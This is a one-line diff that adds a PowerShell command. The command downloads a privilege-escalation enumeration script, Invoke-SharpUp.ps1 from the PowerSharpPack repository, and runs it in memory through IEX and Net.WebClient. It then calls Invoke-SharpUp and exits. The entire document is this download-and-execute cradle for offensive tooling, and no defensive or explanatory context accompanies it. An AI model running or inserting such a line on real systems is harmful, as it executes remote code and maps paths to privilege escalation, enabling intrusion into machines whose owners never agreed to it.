@@ -1,0 +1,1 @@
+Powershell -NoExit IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1'); $m = Invoke-SharpUp; $m; exit
